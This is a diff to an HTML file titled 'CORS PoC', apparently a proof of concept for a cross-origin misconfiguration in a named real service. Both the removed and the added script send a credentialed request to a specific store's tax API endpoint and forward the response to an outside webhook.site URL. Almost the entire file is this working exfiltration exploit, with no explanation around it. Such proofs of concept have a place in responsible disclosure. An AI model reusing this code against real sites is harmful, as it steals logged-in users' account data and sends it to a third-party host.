@@ -3,16 +3,30 @@
     <title>CORS PoC</title>
   </head>
   <body>
+    <button id="poc">req</button>
     <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
-    var req = new XMLHttpRequest();
-    req.onload = reqListener;
-    req.open('get','https://smartbiz.amazon.in/api/stores/66307/tax',true);
-    req.withCredentials = true;
-    req.send();
-
-  function reqListener() {
-  location='https://webhook.site/046b05de-2f7d-43ae-9875-6971f7658023/?key='+this.responseText;
-};
-</script>"></iframe>
+      document.getElementById('poc').addEventListener('click', function() {
+        const url = "https://smartbiz.amazon.in/api/stores/66307/tax";
+        fetch(url, { credentials: "include" }) 
+          .then(r => r.json())
+          .then(data => {
+            alert("Received data:\n" + JSON.stringify(data, null, 2));
+            console.log("Got JSON:", data);
+            return fetch("https://webhook.site/fbb0058d-4bc0-4d7b-a755-850147fcb6eb", {
+              method: "POST",
+              headers: { "Content-Type": "text/plain" },
+              body: JSON.stringify(data)
+            });
+          })
+          .then(response => {
+            console.log("Forwarded to webhook:", response.status);
+            alert("Sent");
+          })
+          .catch(err => {
+            console.error("Error:", err);
+            alert("Error: " + err);
+          });
+      });
+    </script>"></iframe>
   </body>
 </html>
